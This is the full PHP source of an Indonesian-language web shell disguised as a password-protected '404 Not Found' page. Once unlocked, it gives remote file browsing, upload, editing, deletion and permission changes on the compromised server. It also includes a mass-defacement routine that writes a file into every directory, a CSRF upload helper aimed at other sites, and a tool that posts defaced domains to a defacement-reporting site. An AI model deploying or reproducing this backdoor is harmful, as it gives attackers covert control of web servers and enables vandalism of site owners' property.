<?php
$squr = "5a077a8964999eab6bca263230adca9c"; /*godzrilsxc*/ 
session_start();
@error_reporting(0);
@set_time_limit(0);
function Login() {
?>
<!DOCTYPE html>
<html>
<head>
  <title>404 Not Found</title>
<style>
input[type=password] {
	width: 300px;
	height: 25px;
	color: black;
	background: white;
	border: 1px dotted white;
	padding: 5px;
	margin-left: 20px;
	text-align: left;
	}
	</style>
	<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
	<body bgcolor="white">
<font size='6px'>Not Found<br>
<font size='3px'>The requested URL was not found on this server.
<br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</font>
<form method='post'>
<input type='password' name='squr_shell'>
</form>

<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($squr) || ( isset($_POST['squr_shell']) && (md5($_POST['squr_shell']) == $squr) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        Login();
?>
<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<!--
###############################################################################
// Shell ini adalah kumpulan dari beberapa shell yg sudah ada.
###############################################################################
-->
<head>
	<link href="https://fonts.googleapis.com/css?family=Black+Ops+One" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css?family=Sedgwick+Ave+Display" rel="stylesheet">
<title>5.h.3.l.l...?</title>
<style>
body{
font-family: Merienda;
background-color: black;
color: white;
}
#content tr:hover{
background-color: blue;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: yellow;
}
table{
border: 1px #000000;
}
a{
color:white;
font-size: 18px;
text-decoration:none;
}
a:hover{
color:green;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 2px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
h1{
color:lime;
font-size:15px;
}
h2{
font-family:Kelly Slab;
font-size:25px;
color:white;
}
h3{
font-size:35px;
}
h4{
font-size:15px;
font-family:Kelly Slab;
color:white;
}
.a_squr{
color:lime;
font-size:16px;
}
.squr_table {
    -moz-box-shadow:inset 0px 34px 0px -15px #1a1717;
	-webkit-box-shadow:inset 0px 34px 0px -15px #1a1717;
	box-shadow:inset 0px 34px 0px -15px #1a1717;
	background-color:silver;
	border:1px solid blue;
	font-family:Kelly Slab;
    display:inline-block;
	cursor:pointer;
	color:aqua;
	font-size:17x;
	font-weight:bold;
	padding:3px 20px;
	text-decoration:none;
	text-shadow:0px -1px 0px #ff0505;
       }
.kontol {
	font-family:Kelly Slab;
	color:red;
	font-size:10px;
	}
</style>
</head>
<body>
<center>
<img border="0" src="https://i.ibb.co/VgKckJj/image.jpg" width="250" height=""><br>
<font face="Sedgwick Ave Display" color="white" style="text-shadow: 0 0 7px blue, 0 0 45px blue; font-weight:bold: blue; font-size:45px">XxX 5quarep4ntz 5h3ll XxX</font><br>
</h1></center>
<table width="960" border="1" cellpadding="0" cellspacing="0" align="left">
<tr><td>';
echo "<h1><font color='white'>
your IP      : </font>".$_SERVER['REMOTE_ADDR']."<br><font color='white'>
IP Server   : </font>".gethostbyname($_SERVER['HTTP_HOST'])."<br><font color='white'>
system      : </font>".php_uname()."<br>";
echo "</tr></td></h1>";
echo "<table width='960' border='1' cellpadding='0' cellspacing='0' align='left'>
<tr><td><h1><font color='white'>
current dir : </font>
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a class="a_squr" href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a class="a_squr" href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</tr></td></h1><br>';
echo '<table width="960" border="1" cellpadding="0" cellspacing="0" align="center">
<tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<script> alert("UPLOADED SUCCES !!!!!")</script><br/>';
}else{
echo '<script> alert("UPLOADED FAILED !!!!!")</script></font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white"><br><b>Upload :</font><input type="file" name="file" style="font-family:Kelly Slab;font-size:15;background:blue;color:gold;border:2px solid red;"/>
<input type="submit" value="Upload" style="margin-top:4px;width:100px;font-family:Kelly Slab;font-size:15;background:black;color:gold;border:2px solid red;border-radius:5px"/><br><br>
</form>';
echo "</td></tr>";
echo "</table>";
echo "<center><table id='menu' width='960' border='2' cellpadding='3' cellspacing='0'><tr><td>";
echo "<center><a class='squr_table' href='?'>home  </a> 
<a class='squr_table' href='?option&path=$path&squr=csrf'>csrf online</a>
<a class='squr_table' href='?option&path=$path&squr=mass'>mass deface</a>
<a class='squr_table' href='?option&path=$path&squr=defid'>defacer id</a><br>
<a class='squr_table' href='?option&path=$path&squr=multi'>multiple upload</a>
<a class='squr_table' href='?option&path=$path&squr=coming'>symlink</a>
<a class='squr_table' href='?option&path=$path&squr=coming'>wp bruteforce v.1</a>
<a class='squr_table' href='?option&path=$path&squr=coming'>wp bruteforce v.2</a><br>
<a class='squr_table' href='?option&path=$path&squr=coming'>ngewe online</a>
<a class='squr_table' href='?option&path=$path&squr=coming'>nomer sedot wc</a>
<a class='squr_table' href='?option&path=$path&squr=coming'>koleksi poto tempek chino</a>
<a class='squr_table' href='?option&path=$path&squr=about'>about me</a>
<a class='squr_table' href='?logout'>logout</a><br>
</center>";
echo "</td></tr></table></center>";
if(isset($_GET['logout'])) {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    print "<script>window.location='?';</script>";
}
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="lime">Change Perm bisa om</font><br/>';
}else{
echo '<font color="red">Change Perm Gagal Om</font><br />';
}
}
echo '<form method="POST"><font face="Sedgwick Ave Display">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="lime">Rename berhasil Om</font><br/>';
}else{
echo '<font color="red">Rename Gagal Om</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}
elseif ($_GET['squr'] == 'csrf') {
        echo "<div style='text-align: center;' class='mybox'>
 <h2>CSRF Exploiter Online</h2><br><hr color='red'><br>
    <form method='post'>
URL           : &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<input type='text' style='border:0;border-bottom:1px solid #292929; width:500px;' name='url' size='50' height='10' placeholder='http://target.com/[path]/upload.php' style='margin: 5px auto; padding-left: 5px;' required><br><br>
POST File : <input type='text' name='data' style='border:0;border-bottom:1px solid #292929; width:500px;' size='50' height='10' placeholder='Filedata / files[] / qqfile / userfile / dll' style='margin: 5px auto; padding-left: 5px;' required><br>
<br><input style='width: 50px; height: 30px; border-color=white;margin:10px 2px 0 2px;' class='kotak' type='submit' name='go' value='Lock!'>
</form></div>";
        $url = $_POST['url'];
        $data = $_POST['data'];
        $submit = $_POST['go'];
        if ($submit) {
            echo "<br><form style='text-align:center' method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$data'><input style='width: 50px; height: 30px; border-color=white;margin:10px 2px 0 2px;' type='submit' name='ok' class='kotak' value='Upload'>
    </form></div>";
        };
  }
 elseif($_GET['squr'] == 'multi') {
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="lime">UPLOAD SUCCESSSSS !!!!<br></font><br/>';
}else{
echo '<font color="red">UPLOAD FAILEDDDD !!!!!!!</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
</font><input type="file" name="file" style="font-family:Kelly Slab;font-size:15;background:silver;color:black;border:2px solid red;"/>
<input type="file" name="file" style="font-family:Kelly Slab;font-size:15;background:lime;color:black;border:2px solid red;"/><br>
<input type="file" name="file" style="font-family:Kelly Slab;font-size:15;background:yellow;color:black;border:2px solid red;"/><br>
<input type="submit" value="Upload" style="margin-top:4px;width:100px;font-family:Kelly Slab;font-size:15;background:black;color:gold;border:2px solid red;border-radius:5px"/><br><br>
</form>';}
 elseif($_GET['squr'] == 'mass') {
echo "<center><br/><b><div> <h2>MASS DEFACE </h2></div></center></b><br>";
error_reporting(0);?>
<form ENCTYPE="multipart/form-data" action="<?php $_SERVER['PHP_SELF']?>" method='post'>
<td><table><table class="tabnet" >
<form hethot='post'>
<tr>
	<tr>
	<td>&nbsp;&nbsp;Folder</td><td><input class ='inputz' type='text' name='path' size='60' value="<?php echo getcwd();?>"></td>
	</tr><br>
	<tr>
	<td>nama file</td><td><input class ='inputz' type='text' name='file' size='60' value="squr.html"></td>
	</tr>
</tr>
<th colspan='2'><b>Index File</b></th><br></table>
<textarea style='background:white;outline:none;' name='index' rows='10' cols='67'>5quarep4ntz // godzril</textarea><br>
<center><input class='inputzbut' type='submit' value="&nbsp;&nbsp;Deface&nbsp;&nbsp;"></center></form></table><br></form>

<?php
$mainpath=$_POST[path];
$file=$_POST[file];
$dir=opendir("$mainpath");$code=base64_encode($_POST[index]);
$indx=base64_decode($code);while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
$finish=@fwrite($start,$indx);if ($finish){echo "$row/$file<br><br>";}}}
elseif($_GET['squr'] == 'about') {
echo '
	<center><br><br>
    <br><img src="https://i.ibb.co/wRvxB5J/1574957392-picsay.jpg" widgt="200" height="200"><br>
            <br><h2>Contact : 5quarep4ntz@gmail.com<br>
intagram :<a href="https://www.instagram.com/hay_god45" target="_blank"> hay_god45</h2></center>
<br><br><br>';}
elseif($_GET['squr'] == 'coming') {
echo '
	<center><br><br>
    <br>
            <br><h3> Coming Soon :(<h3></center>
<br><br><br>';}
elseif ($_GET['squr'] == 'defid') {
        echo "<div class='mybox' style='text-align:center'><h2>defacer id Mass Poster</h2><hr color='red'>
        <form method='post'>
        <h2>Defacer : 
        <input type='text' style='border:0;border-bottom:1px solid #292929; width:500px;' name='hekel' placeholder='5quarep4ntz'><br><br>
        Team : 
        &nbsp&nbsp&nbsp<input type='text' style='border:0;border-bottom:1px solid black; width:500px;' name='tim' placeholder='sharkxploit'><br><br>
        Domains : </h2><br>
        <textarea class='mybox' style='border-color:red' rows='10' cols='67' name='sites'></textarea><br>
        <input type='submit' style='width: 50px; height: 30px; border-color=white;margin:10px 2px 0 2px;' name='sikat' value='Submit' class='kotak'>
        </form></div>";
        $site = explode("\
\
", $_POST['sites']);
        $go = $_POST['sikat'];
        $hekel = $_POST['hekel'];
        $tim = $_POST['tim'];
        if ($go) {
            foreach ($site as $sites) {
                $zh = $sites;
                $form_url = "https://www.jonesguide/notify.html";
                $data_to_post = array();
                $data_to_post['attacker'] = "$hekel";
                $data_to_post['team'] = "$tim";
                $data_to_post['poc'] = 'SQL Injection';
                $data_to_post['url'] = "$zh";
                $curl = curl_init();
                curl_setopt($curl, CURLOPT_URL, $form_url);
                curl_setopt($curl, CURLOPT_POST, sizeof($data_to_post));
                curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
                curl_setopt($curl, CURLOPT_POSTFIELDS, $data_to_post);
                curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($curl, CURLOPT_REFERER, 'https://jonesguide.com/notify.html');
                $result = curl_exec($curl);
                echo $result;
                curl_close($curl);
                echo "<br>";
            }
        }
    } 
elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="lime">berhasil om</font><br/>';
}else{
echo '<font color="red">Gagal om servernya kek tai</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="lime">Directory Terhapus om</font><br/>';
}else{
echo '<font color="red">Directory Gagal Terhapus om                                                                                                                                                                                                                                                                                           </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="lime">Terhapus om</font><br/>';
}else{
echo '<font color="red">File Gagal Dihapus om</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="960" border="2" cellpadding="3" cellspacing="0" align="center">
<tr class="first">
<td><center><font color="black">N4m3</peller></center></td>
<td><center><font color="black">S1z3</peller></center></td>
<td><center><font color="black">P3rm15ion</peller></center></td>
<td><center><font color="black">4ct1on</peller></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="aqua">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">RenaMe</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="aqua">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/><font face="Sedgwick Ave Display" color="white" style="text-shadow: 0 0 20px blue, 0 0 5px blue, 0 0 7px blue, 0 0 45px blue; font-weight:bold: blue; font-size:35px">recoded by 5quarep4ntz</center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>